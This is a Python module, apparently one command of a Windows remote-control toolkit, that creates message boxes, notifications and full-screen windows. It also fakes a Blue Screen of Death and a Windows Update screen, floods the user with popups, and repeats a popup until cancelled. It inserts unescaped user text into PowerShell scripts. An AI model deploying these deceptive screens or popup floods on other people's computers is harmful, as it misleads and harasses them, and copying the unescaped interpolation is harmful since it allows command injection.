#!/usr/bin/env python3
"""
Elite Popup Command - Advanced popup and notification system
Comprehensive popup creation with various styles and behaviors
"""

import ctypes
from ctypes import wintypes
import subprocess
import threading
import time

class ElitePopup:
    """Elite popup and notification system"""
    
    def __init__(self):
        self.kernel32 = ctypes.windll.kernel32
        self.user32 = ctypes.windll.user32
        
    def execute(self, popup_type='messagebox', title=None, message=None, style='info', duration=0, **kwargs):
        """Create various types of popups"""
        try:
            if popup_type == 'messagebox':
                return self._create_messagebox(title, message, style)
            elif popup_type == 'balloon':
                return self._create_balloon_tip(title, message, style, duration)
            elif popup_type == 'toast':
                return self._create_toast_notification(title, message, duration)
            elif popup_type == 'fullscreen':
                return self._create_fullscreen_popup(title, message, style)
            elif popup_type == 'fake_bsod':
                return self._create_fake_bsod()
            elif popup_type == 'fake_update':
                return self._create_fake_update()
            elif popup_type == 'spam':
                return self._create_popup_spam(title, message, kwargs.get('count', 10))
            elif popup_type == 'persistent':
                return self._create_persistent_popup(title, message, duration)
            else:
                return {
                    'success': False,
                    'error': f'Unknown popup type: {popup_type}',
                    'available_types': ['messagebox', 'balloon', 'toast', 'fullscreen', 'fake_bsod', 'fake_update', 'spam', 'persistent']
                }
                
        except Exception as e:
            return {
                'success': False,
                'error': f'Popup creation failed: {str(e)}'
            }
    
    def _create_messagebox(self, title, message, style):
        """Create standard Windows message box"""
        try:
            if not title:
                title = "System Message"
            if not message:
                message = "This is a test message."
            
            # Define message box styles
            style_map = {
                'info': 0x40,      # MB_ICONINFORMATION
                'warning': 0x30,   # MB_ICONWARNING
                'error': 0x10,     # MB_ICONERROR
                'question': 0x20,  # MB_ICONQUESTION
                'ok': 0x0,         # MB_OK
                'okcancel': 0x1,   # MB_OKCANCEL
                'yesno': 0x4,      # MB_YESNO
                'yesnocancel': 0x3 # MB_YESNOCANCEL
            }
            
            mb_style = style_map.get(style, 0x40)
            
            # Create message box
            result = self.user32.MessageBoxW(
                None,
                message,
                title,
                mb_style
            )
            
            # Map return values
            result_map = {
                1: 'OK',
                2: 'Cancel',
                6: 'Yes',
                7: 'No'
            }
            
            return {
                'success': True,
                'popup_type': 'messagebox',
                'title': title,
                'message': message,
                'style': style,
                'user_response': result_map.get(result, f'Unknown ({result})')
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': f'Message box creation failed: {str(e)}'
            }
    
    def _create_balloon_tip(self, title, message, style, duration):
        """Create balloon tip notification"""
        try:
            if not title:
                title = "Notification"
            if not message:
                message = "This is a balloon tip notification."
            
            # Use PowerShell to create balloon tip
            ps_script = f'''
Add-Type -AssemblyName System.Windows.Forms

$balloon = New-Object System.Windows.Forms.NotifyIcon
$balloon.Icon = [System.Drawing.SystemIcons]::Information
$balloon.BalloonTipTitle = "{title}"
$balloon.BalloonTipText = "{message}"

# Set balloon tip icon based on style
switch ("{style}") {{
    "info" {{ $balloon.BalloonTipIcon = [System.Windows.Forms.ToolTipIcon]::Info }}
    "warning" {{ $balloon.BalloonTipIcon = [System.Windows.Forms.ToolTipIcon]::Warning }}
    "error" {{ $balloon.BalloonTipIcon = [System.Windows.Forms.ToolTipIcon]::Error }}
    default {{ $balloon.BalloonTipIcon = [System.Windows.Forms.ToolTipIcon]::Info }}
}}

$balloon.Visible = $true
$balloon.ShowBalloonTip({duration * 1000 if duration > 0 else 5000})

if ({duration} -gt 0) {{
    Start-Sleep -Seconds {duration}
    $balloon.Dispose()
}}

Write-Output "Balloon tip displayed"
'''
            
            try:
                result = subprocess.run(['powershell', '-WindowStyle', 'Hidden', '-Command', ps_script], 
                                      capture_output=True, text=True, timeout=30)
                
                return {
                    'success': result.returncode == 0,
                    'popup_type': 'balloon',
                    'title': title,
                    'message': message,
                    'style': style,
                    'duration': duration,
                    'output': result.stdout.strip()
                }
                
            except subprocess.TimeoutExpired:
                return {
                    'success': False,
                    'error': 'Balloon tip creation timed out'
                }
                
        except Exception as e:
            return {
                'success': False,
                'error': f'Balloon tip creation failed: {str(e)}'
            }
    
    def _create_toast_notification(self, title, message, duration):
        """Create Windows 10 toast notification"""
        try:
            if not title:
                title = "Toast Notification"
            if not message:
                message = "This is a toast notification."
            
            # Use PowerShell to create toast notification
            ps_script = f'''
[Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType = WindowsRuntime] | Out-Null
[Windows.UI.Notifications.ToastNotification, Windows.UI.Notifications, ContentType = WindowsRuntime] | Out-Null
[Windows.Data.Xml.Dom.XmlDocument, Windows.Data.Xml.Dom.XmlDocument, ContentType = WindowsRuntime] | Out-Null

$template = @"
<toast>
    <visual>
        <binding template="ToastGeneric">
            <text>{title}</text>
            <text>{message}</text>
        </binding>
    </visual>
</toast>
"@

$xml = New-Object Windows.Data.Xml.Dom.XmlDocument
$xml.LoadXml($template)

$toast = New-Object Windows.UI.Notifications.ToastNotification $xml
$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier("PowerShell")

try {{
    $notifier.Show($toast)
    Write-Output "Toast notification displayed"
}} catch {{
    Write-Output "Toast notification failed: $($_.Exception.Message)"
}}
'''
            
            try:
                result = subprocess.run(['powershell', '-Command', ps_script], 
                                      capture_output=True, text=True, timeout=15)
                
                success = 'Toast notification displayed' in result.stdout
                
                return {
                    'success': success,
                    'popup_type': 'toast',
                    'title': title,
                    'message': message,
                    'duration': duration,
                    'output': result.stdout.strip(),
                    'error_output': result.stderr.strip() if result.stderr else None
                }
                
            except subprocess.TimeoutExpired:
                return {
                    'success': False,
                    'error': 'Toast notification creation timed out'
                }
                
        except Exception as e:
            return {
                'success': False,
                'error': f'Toast notification creation failed: {str(e)}'
            }
    
    def _create_fullscreen_popup(self, title, message, style):
        """Create fullscreen popup window"""
        try:
            if not title:
                title = "System Alert"
            if not message:
                message = "This is a fullscreen popup message."
            
            # Use PowerShell to create fullscreen window
            ps_script = f'''
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object System.Windows.Forms.Form
$form.Text = "{title}"
$form.WindowState = [System.Windows.Forms.FormWindowState]::Maximized
$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None
$form.TopMost = $true
$form.StartPosition = [System.Windows.Forms.FormStartPosition]::Manual
$form.Location = New-Object System.Drawing.Point(0, 0)
$form.Size = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Size

# Set background color based on style
switch ("{style}") {{
    "error" {{ $form.BackColor = [System.Drawing.Color]::Red }}
    "warning" {{ $form.BackColor = [System.Drawing.Color]::Orange }}
    "info" {{ $form.BackColor = [System.Drawing.Color]::Blue }}
    default {{ $form.BackColor = [System.Drawing.Color]::Black }}
}}

# Title label
$titleLabel = New-Object System.Windows.Forms.Label
$titleLabel.Text = "{title}"
$titleLabel.ForeColor = [System.Drawing.Color]::White
$titleLabel.Font = New-Object System.Drawing.Font("Arial", 24, [System.Drawing.FontStyle]::Bold)
$titleLabel.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
$titleLabel.Dock = [System.Windows.Forms.DockStyle]::Top
$titleLabel.Height = 100
$form.Controls.Add($titleLabel)

# Message label
$messageLabel = New-Object System.Windows.Forms.Label
$messageLabel.Text = "{message}"
$messageLabel.ForeColor = [System.Drawing.Color]::White
$messageLabel.Font = New-Object System.Drawing.Font("Arial", 16)
$messageLabel.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
$messageLabel.Dock = [System.Windows.Forms.DockStyle]::Fill
$form.Controls.Add($messageLabel)

# Close button
$closeButton = New-Object System.Windows.Forms.Button
$closeButton.Text = "Close"
$closeButton.Size = New-Object System.Drawing.Size(100, 40)
$closeButton.Location = New-Object System.Drawing.Point(($form.Width / 2 - 50), ($form.Height - 100))
$closeButton.Anchor = [System.Windows.Forms.AnchorStyles]::Bottom
$closeButton.Add_Click({{ $form.Close() }})
$form.Controls.Add($closeButton)

# Handle Escape key
$form.Add_KeyDown({{
    if ($_.KeyCode -eq [System.Windows.Forms.Keys]::Escape) {{
        $form.Close()
    }}
}})

$form.ShowDialog() | Out-Null
Write-Output "Fullscreen popup closed"
'''
            
            try:
                # Run in separate thread to avoid blocking
                def run_popup():
                    subprocess.run(['powershell', '-Command', ps_script], 
                                 capture_output=True, text=True, timeout=60)
                
                popup_thread = threading.Thread(target=run_popup, daemon=True)
                popup_thread.start()
                
                return {
                    'success': True,
                    'popup_type': 'fullscreen',
                    'title': title,
                    'message': message,
                    'style': style,
                    'note': 'Fullscreen popup started in background thread'
                }
                
            except Exception as e:
                return {
                    'success': False,
                    'error': f'Fullscreen popup failed: {str(e)}'
                }
                
        except Exception as e:
            return {
                'success': False,
                'error': f'Fullscreen popup creation failed: {str(e)}'
            }
    
    def _create_fake_bsod(self):
        """Create fake Blue Screen of Death"""
        try:
            ps_script = '''
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object System.Windows.Forms.Form
$form.Text = "Blue Screen"
$form.WindowState = [System.Windows.Forms.FormWindowState]::Maximized
$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None
$form.TopMost = $true
$form.BackColor = [System.Drawing.Color]::Blue
$form.StartPosition = [System.Windows.Forms.FormStartPosition]::Manual
$form.Location = New-Object System.Drawing.Point(0, 0)
$form.Size = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Size

# BSOD Text
$bsodText = @"
A problem has been detected and Windows has been shut down to prevent damage
to your computer.

DRIVER_IRQL_NOT_LESS_OR_EQUAL

If this is the first time you've seen this stop error screen,
restart your computer. If this screen appears again, follow
these steps:

Check to make sure any new hardware or software is properly installed.
If this is a new installation, ask your hardware or software manufacturer
for any Windows updates you might need.

If problems continue, disable or remove any newly installed hardware
or software. Disable BIOS memory options such as caching or shadowing.
If you need to use Safe Mode to remove or disable components, restart
your computer, press F8 to select Advanced Startup Options, and then
select Safe Mode.

Technical information:

*** STOP: 0x000000D1 (0x00000000, 0x00000002, 0x00000000, 0x00000000)

Beginning dump of physical memory
Physical memory dump complete.
Contact your system administrator or technical support group for further
assistance.
"@

$label = New-Object System.Windows.Forms.Label
$label.Text = $bsodText
$label.ForeColor = [System.Drawing.Color]::White
$label.Font = New-Object System.Drawing.Font("Consolas", 12)
$label.Location = New-Object System.Drawing.Point(50, 50)
$label.Size = New-Object System.Drawing.Size(($form.Width - 100), ($form.Height - 100))
$form.Controls.Add($label)

# Handle Escape key to close
$form.Add_KeyDown({
    if ($_.KeyCode -eq [System.Windows.Forms.Keys]::Escape) {
        $form.Close()
    }
})

# Auto-close after 10 seconds
$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 10000
$timer.Add_Tick({
    $form.Close()
    $timer.Stop()
})
$timer.Start()

$form.ShowDialog() | Out-Null
Write-Output "Fake BSOD closed"
'''
            
            try:
                def run_bsod():
                    subprocess.run(['powershell', '-Command', ps_script], 
                                 capture_output=True, text=True, timeout=15)
                
                bsod_thread = threading.Thread(target=run_bsod, daemon=True)
                bsod_thread.start()
                
                return {
                    'success': True,
                    'popup_type': 'fake_bsod',
                    'message': 'Fake BSOD displayed (auto-closes in 10 seconds, or press Escape)',
                    'note': 'This is a fake BSOD for demonstration purposes only'
                }
                
            except Exception as e:
                return {
                    'success': False,
                    'error': f'Fake BSOD failed: {str(e)}'
                }
                
        except Exception as e:
            return {
                'success': False,
                'error': f'Fake BSOD creation failed: {str(e)}'
            }
    
    def _create_fake_update(self):
        """Create fake Windows update screen"""
        try:
            ps_script = '''
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object System.Windows.Forms.Form
$form.Text = "Windows Update"
$form.WindowState = [System.Windows.Forms.FormWindowState]::Maximized
$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None
$form.TopMost = $true
$form.BackColor = [System.Drawing.Color]::FromArgb(0, 120, 215)
$form.StartPosition = [System.Windows.Forms.FormStartPosition]::Manual

# Windows logo
$logoLabel = New-Object System.Windows.Forms.Label
$logoLabel.Text = "Windows"
$logoLabel.ForeColor = [System.Drawing.Color]::White
$logoLabel.Font = New-Object System.Drawing.Font("Segoe UI", 48, [System.Drawing.FontStyle]::Regular)
$logoLabel.Location = New-Object System.Drawing.Point(100, 100)
$logoLabel.Size = New-Object System.Drawing.Size(400, 80)
$form.Controls.Add($logoLabel)

# Update message
$updateLabel = New-Object System.Windows.Forms.Label
$updateLabel.Text = "Getting Windows ready...`nDon't turn off your computer"
$updateLabel.ForeColor = [System.Drawing.Color]::White
$updateLabel.Font = New-Object System.Drawing.Font("Segoe UI", 24)
$updateLabel.Location = New-Object System.Drawing.Point(100, 250)
$updateLabel.Size = New-Object System.Drawing.Size(800, 100)
$form.Controls.Add($updateLabel)

# Progress bar
$progressBar = New-Object System.Windows.Forms.ProgressBar
$progressBar.Location = New-Object System.Drawing.Point(100, 400)
$progressBar.Size = New-Object System.Drawing.Size(600, 30)
$progressBar.Style = [System.Windows.Forms.ProgressBarStyle]::Marquee
$progressBar.MarqueeAnimationSpeed = 30
$form.Controls.Add($progressBar)

# Percentage label
$percentLabel = New-Object System.Windows.Forms.Label
$percentLabel.Text = "0%"
$percentLabel.ForeColor = [System.Drawing.Color]::White
$percentLabel.Font = New-Object System.Drawing.Font("Segoe UI", 18)
$percentLabel.Location = New-Object System.Drawing.Point(100, 450)
$percentLabel.Size = New-Object System.Drawing.Size(100, 30)
$form.Controls.Add($percentLabel)

# Timer to update progress
$progress = 0
$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 200
$timer.Add_Tick({
    $script:progress += 1
    $percentLabel.Text = "$script:progress%"
    if ($script:progress -ge 100) {
        $form.Close()
        $timer.Stop()
    }
})
$timer.Start()

# Handle Escape key
$form.Add_KeyDown({
    if ($_.KeyCode -eq [System.Windows.Forms.Keys]::Escape) {
        $form.Close()
        $timer.Stop()
    }
})

$form.ShowDialog() | Out-Null
Write-Output "Fake update screen closed"
'''
            
            try:
                def run_update():
                    subprocess.run(['powershell', '-Command', ps_script], 
                                 capture_output=True, text=True, timeout=25)
                
                update_thread = threading.Thread(target=run_update, daemon=True)
                update_thread.start()
                
                return {
                    'success': True,
                    'popup_type': 'fake_update',
                    'message': 'Fake Windows update screen displayed (auto-completes in ~20 seconds)',
                    'note': 'This is a fake update screen for demonstration purposes only'
                }
                
            except Exception as e:
                return {
                    'success': False,
                    'error': f'Fake update failed: {str(e)}'
                }
                
        except Exception as e:
            return {
                'success': False,
                'error': f'Fake update creation failed: {str(e)}'
            }
    
    def _create_popup_spam(self, title, message, count):
        """Create multiple popups in rapid succession"""
        try:
            if not title:
                title = "Spam Message"
            if not message:
                message = "This is popup spam!"
            
            def spam_worker():
                for i in range(count):
                    try:
                        popup_title = f"{title} #{i+1}"
                        self.user32.MessageBoxW(
                            None,
                            f"{message} (Popup {i+1} of {count})",
                            popup_title,
                            0x40  # MB_ICONINFORMATION
                        )
                        time.sleep(0.1)  # Small delay between popups
                    except:
                        break
            
            # Start spam in background thread
            spam_thread = threading.Thread(target=spam_worker, daemon=True)
            spam_thread.start()
            
            return {
                'success': True,
                'popup_type': 'spam',
                'title': title,
                'message': message,
                'count': count,
                'note': f'Started popup spam with {count} popups'
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': f'Popup spam creation failed: {str(e)}'
            }
    
    def _create_persistent_popup(self, title, message, duration):
        """Create popup that keeps reappearing"""
        try:
            if not title:
                title = "Persistent Message"
            if not message:
                message = "This popup will keep appearing!"
            
            def persistent_worker():
                end_time = time.time() + duration if duration > 0 else float('inf')
                popup_count = 0
                
                while time.time() < end_time:
                    try:
                        popup_count += 1
                        result = self.user32.MessageBoxW(
                            None,
                            f"{message} (Appearance #{popup_count})",
                            title,
                            0x41  # MB_ICONINFORMATION | MB_OKCANCEL
                        )
                        
                        # If user clicks Cancel, stop
                        if result == 2:  # Cancel
                            break
                            
                        time.sleep(2)  # Wait 2 seconds before next popup
                        
                    except:
                        break
            
            # Start persistent popup in background thread
            persistent_thread = threading.Thread(target=persistent_worker, daemon=True)
            persistent_thread.start()
            
            return {
                'success': True,
                'popup_type': 'persistent',
                'title': title,
                'message': message,
                'duration': duration,
                'note': f'Started persistent popup for {duration} seconds (click Cancel to stop)'
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': f'Persistent popup creation failed: {str(e)}'
            }

def elite_popup(popup_type='messagebox', title=None, message=None, style='info', duration=0, **kwargs):
    """Elite popup command entry point"""
    popup_cmd = ElitePopup()
    return popup_cmd.execute(popup_type, title, message, style, duration, **kwargs)